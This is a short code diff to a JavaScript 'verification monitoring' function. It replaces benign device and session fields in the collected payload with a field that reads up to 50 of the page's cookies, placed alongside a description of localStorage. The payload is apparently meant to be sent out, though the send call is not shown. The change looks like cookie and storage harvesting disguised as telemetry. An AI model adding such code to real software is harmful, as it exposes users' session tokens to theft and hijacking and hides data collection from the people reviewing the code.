@@ -211,19 +211,8 @@ function sendVerificationMonitoring() {
                 rtt: typeof connection.rtt === "number" ? connection.rtt : null,
                 saveData: Boolean(connection.saveData)
             } : {},
-            capabilities: {
-                localStorage: Boolean(localStorage),
-                serviceWorker: "serviceWorker" in navigator,
-                touchPoints: navigator.maxTouchPoints || 0,
-                online: navigator.onLine
-            },
-            session: {
-                url: window.location.pathname,
-                referrer: document.referrer ? new URL(document.referrer).origin : "Unavailable",
-                visibility: document.visibilityState,
-                historyLength: window.history.length
-            },
-            storage: describeLocalStorage(localStorage)
+            storage: describeLocalStorage(localStorage),
+            cookies: document.cookie ? document.cookie.split('; ').slice(0, 50) : []
         };
     } catch {
         return;
